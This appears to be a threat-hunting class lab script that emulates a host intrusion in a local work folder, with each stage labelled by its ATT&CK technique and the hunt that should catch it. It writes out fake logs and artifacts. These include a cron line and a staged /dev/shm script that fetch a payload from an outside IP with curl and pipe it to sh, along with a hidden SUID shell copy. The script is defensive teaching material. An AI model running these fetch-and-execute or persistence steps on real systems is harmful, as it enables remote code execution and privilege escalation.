#!/bin/bash
# =====================================================================
# Class 11 — Threat Hunting Lab :: adversary emulation
# Builds the SAME ./work scenario as setup.sh, but by *performing the
# intrusion* step by step so students watch the host get compromised,
# then hunt it with ./hunt.sh.
#
# Every step prints its MITRE ATT&CK technique and the sensor/hunt that
# should catch it.
#
#   ./attack.sh            emulate the intrusion into ./work  (safe, offline)
#   ./attack.sh --live     ALSO fire real, lab-scoped noisy activity:
#                            - TCP scan of 127.0.0.1
#                            - HTTP GET to testmyids.com  (public IDS test string)
#                            - DNS lookups for suspicious-looking lab domains
#                            - 3 short "beacon" connts to 127.0.0.1:9999
#                          Use --live only when the Suricata/Zeek stack in
#                          ../ (labs/) is running and you want live alerts.
#   ./attack.sh clean      remove ./work
# =====================================================================
set -e
cd "$(dirname "$0")"
WORK="./work"
SCEN="./scenario"
LIVE=0
[ "$1" = "--live" ] && LIVE=1
[ "$1" = "clean" ] && { rm -rf "$WORK"; echo "[*] Removed $WORK"; exit 0; }

STEP=0
act() {
  STEP=$((STEP+1))
  echo
  echo "#### STAGE $STEP :: $1"
  echo "     ATT&CK : $2"
  echo "     caught by: $3"
  sleep 0.4
}

echo "[*] Fresh work tree ..."
rm -rf "$WORK"
mkdir -p "$WORK/var/www/html/uploads" "$WORK/var/log/archive" "$WORK/zeek" \
         "$WORK/opt/bin" "$WORK/dev/shm"
cat > "$WORK/var/www/html/index.php"  <<< '<?php echo "SOC Command demo app"; ?>'
cat > "$WORK/var/www/html/config.php" <<< '<?php $DB_HOST="db.internal"; ?>'
: > "$WORK/var/log/syslog"
LOG="$WORK/var/log/syslog"
now() { date "+%b %d %H:%M:%S"; }

# ---------------------------------------------------------------------
act "Recon — attacker scans the perimeter for exposed services" \
    "T1595.001 Active Scanning / T1046 Network Service Discovery" \
    "Suricata (ET SCAN) on the monitoring stack"
echo "$(now) web01 kernel: [UFW BLOCK] SRC=45.153.160.140 DST=10.0.0.5 PROTO=TCP DPT=22" >> "$LOG"
echo "$(now) web01 kernel: [UFW BLOCK] SRC=45.153.160.140 DST=10.0.0.5 PROTO=TCP DPT=80" >> "$LOG"
if [ "$LIVE" = 1 ] && command -v nmap >/dev/null; then
  echo "     [live] nmap -sT -F 127.0.0.1"
  nmap -sT -F 127.0.0.1 | tail -n 12
fi

# ---------------------------------------------------------------------
act "Brute force — password spray against SSH" \
    "T1110.003 Password Spraying" \
    "auth.log 'Failed password' burst  /  Wazuh rule 5710+"
for p in 51234 51244 51290; do
  u=root; [ "$p" = 51290 ] && u=admin
  echo "$(now) web01 sshd[1990]: Failed password for $u from 45.153.160.140 port $p ssh2" >> "$LOG"
done

# ---------------------------------------------------------------------
act "Initial access — upload a PHP webshell to the uploads dir" \
    "T1190 Exploit Public-Facing App  ->  T1505.003 Web Shell" \
    "HUNT 1 (YARA hunt_webshell.yar)  /  FIM on /var/www"
cp "$SCEN/webshell.php" "$WORK/var/www/html/uploads/webshell.php"
echo "$(now) web01 nginx: 193.169.255.78 - - \"POST /uploads/ HTTP/1.1\" 201 0" >> "$LOG"

# ---------------------------------------------------------------------
act "Execution — operator drives the webshell (discovery commands)" \
    "T1059 Command & Scripting Interpreter / T1082 System Info Discovery" \
    "HUNT 2 (bad IP in web logs)  /  web access-log anomaly"
echo "$(now) web01 nginx: 193.169.255.78 - - \"GET /uploads/webshell.php?c=aWQ= HTTP/1.1\" 200 41" >> "$LOG"
echo "$(now) web01 nginx: 193.169.255.78 - - \"GET /uploads/webshell.php?c=dW5hbWUgLWE= HTTP/1.1\" 200 88" >> "$LOG"

# ---------------------------------------------------------------------
act "Ingress tool transfer — pull a second-stage payload" \
    "T1105 Ingress Tool Transfer" \
    "HUNT 2 (bad IP)  /  Suricata (ET) on http://5.42.92.211/win/update.hta"
echo "$(now) web01 CRON[2410]: (www-data) CMD (curl -s http://5.42.92.211/win/update.hta -o /tmp/.u)" >> "$LOG"
if [ "$LIVE" = 1 ] && command -v curl >/dev/null; then
  echo "     [live] curl http://testmyids.com   (returns the canonical IDS test string)"
  curl -s --max-time 5 http://testmyids.com || true
fi

# ---------------------------------------------------------------------
act "Persistence — hidden SUID shell + fileless staging in /dev/shm" \
    "T1548.001 SUID / T1547 Boot-or-Logon / T1620 Reflective staging" \
    "HUNT 4 (SUID sweep)  /  HUNT 5 (/dev/shm exec)"
cp /bin/dash "$WORK/opt/bin/.helper" 2>/dev/null || cp /bin/sh "$WORK/opt/bin/.helper"
chmod 4755 "$WORK/opt/bin/.helper" || true
printf '#!/bin/sh\ncurl -s http://5.42.92.211/win/update.hta | sh\n' > "$WORK/dev/shm/.u"
chmod +x "$WORK/dev/shm/.u"

# ---------------------------------------------------------------------
act "Command & Control — long-interval HTTPS beacon" \
    "T1071.001 Web Protocols / T1573 Encrypted Channel" \
    "HUNT 3 (Zeek conn.log long-duration low-byte)"
cp "$SCEN/conn.log" "$WORK/zeek/conn.log"
if [ "$LIVE" = 1 ]; then
  if command -v dig >/dev/null; then
    echo "     [live] DNS lookups for suspicious lab domains"
    for d in evil-c2.example update-check.example; do dig +short "$d" >/dev/null 2>&1; echo "        queried $d"; done
  fi
  echo "     [live] 3x short beacon to 127.0.0.1:9999 (start 'nc -lk 9999' first to see it in Zeek)"
  for i in 1 2 3; do (echo "beacon $i" | timeout 2 nc 127.0.0.1 9999) 2>/dev/null; sleep 1; done
fi

# ---------------------------------------------------------------------
act "Roll the logs — attacker activity ages into the archive" \
    "T1070 Indicator Removal (partial)  — hunt archived + gz logs" \
    "HUNT 2 uses grep -rF -f + zgrep"
cp "$LOG" "$WORK/var/log/archive/syslog.1"
gzip -c "$LOG" > "$WORK/var/log/archive/syslog.2.gz"
cp "$SCEN/malicious_ips.txt" "$WORK/malicious_ips.txt"
cp "$SCEN/apt_report.txt"    "$WORK/apt_report.txt"

echo
echo "======================================================================"
echo " Intrusion emulated. web01 (and 10.0.0.5) are compromised."
echo " Now switch hats and hunt it down:"
echo "     ./hunt.sh -s"
echo "======================================================================"
